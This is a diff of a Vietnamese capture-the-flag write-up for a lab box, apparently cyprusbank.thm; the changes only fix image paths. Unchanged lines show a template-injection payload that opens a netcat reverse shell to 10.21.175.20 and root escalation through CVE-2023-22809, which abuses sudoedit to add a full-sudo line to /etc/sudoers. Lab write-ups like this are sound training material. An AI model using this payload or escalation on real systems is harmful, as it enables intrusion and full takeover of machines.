@@ -110,41 +110,41 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u h
 - Có vẻ payload thực thi thành công, tiến hành tạo `reverse shell`
 
 - Tạo shell trên revshells.com
-![Hoangdeptrai](\Images\Reverse.com.png)
+![Hoangdeptrai](Images\Reverse.com.png)
 
 - Ta được payload:
 ```
 &settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.21.175.20 1234 -e /bin/sh');//
 ```
 - Chèn payload thông qua `Burp Suite`, listen port: `nc -lvnp 1234`
-![Hoangdeptrai](\Images\Insert_payload.png)
+![Hoangdeptrai](Images\Insert_payload.png)
 
-![Hoangdeptrai](\Images\Reverse_shell.png)
+![Hoangdeptrai](Images\Reverse_shell.png)
 
 - Sau khi nhận `reverse shell` thành công, update shell cho dễ nhìn:
-![Hoangdeptrai](\Images\Update_shell.png)
+![Hoangdeptrai](Images\Update_shell.png)
 
 - Tìm kiếm web flag, tìm được trong file `/home/web/user.txt`
 
-![Hoangdeptrai](\Images\Flag1.png)
+![Hoangdeptrai](Images\Flag1.png)
 
-![Hoangdeptrai](\Images\Flag1.1.png)
+![Hoangdeptrai](Images\Flag1.1.png)
 
 ## 5. Leo quyền lên root shell
 - Kiểm tra những quyền có thể chạy với sudo qua lệnh `sudo -l`
-![Hoangdeptrai](\Images\sudo-l.png)
+![Hoangdeptrai](Images\sudo-l.png)
 
 - Có thể thấy ta có quyền chạy `sudoedit` với quyền sudo
 
 - Tìm kiếm xem có lỗ hổng nào có thể khai thác với quyền này không 
 
-![Hoangdeptrai](\Images\sudoedit_cve.png)
+![Hoangdeptrai](Images\sudoedit_cve.png)
 
 - `CVE-2023-22809` cho phép leo thang đặc quyền với `sudo 1.8.0 đến 1.9.12p1`
-![Hoangdeptrai](\Images\CVE-2023-22809.png)
+![Hoangdeptrai](Images\CVE-2023-22809.png)
 - Kiểm tra phiên bản sudo của máy chủ:
 
-![Hoangdeptrai](\Images\sudoedit-v.png)
+![Hoangdeptrai](Images\sudoedit-v.png)
 
 -> Phiên bản phù hợp, có thể khai thác.
 - Sử dụng lệnh:
@@ -159,20 +159,20 @@ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
     - Mục đích là đánh lừa `sudoedit` mở file tùy ý (`/etc/sudoers`) dù người dùng chỉ được cấp quyền chỉnh sửa `/etc/nginx/sites-available/admin.cyprusbank.thm.`
 - Sau khi thành công mở file `/etc/sudoers` bằng `vi`, chèn thêm dòng `web ALL=(ALL:ALL) ALL` với mục đích cho user `web` có toàn quyền `sudo`
 
-![Hoangdeptrai](\Images\All_root.png)
+![Hoangdeptrai](Images\All_root.png)
 - Sau khi chèn thành công, `sudo su` để vào quyền root
 
-![Hoangdeptrai](\Images\Sudo-su.png)
+![Hoangdeptrai](Images\Sudo-su.png)
 
 - Chiếm quyền `root` thành công, tìm flag trong `/root/root.txt`
 
-![Hoangdeptrai](\Images\flag2.png)
+![Hoangdeptrai](Images\flag2.png)
 
-![Hoangdeptrai](\Images\flag2.2.png)
+![Hoangdeptrai](Images\flag2.2.png)
 
 => Hoàn thành Lab hi :)
 
-![Hoangdeptrai](\Images\complete.png)
+![Hoangdeptrai](Images\complete.png)
 
 
 
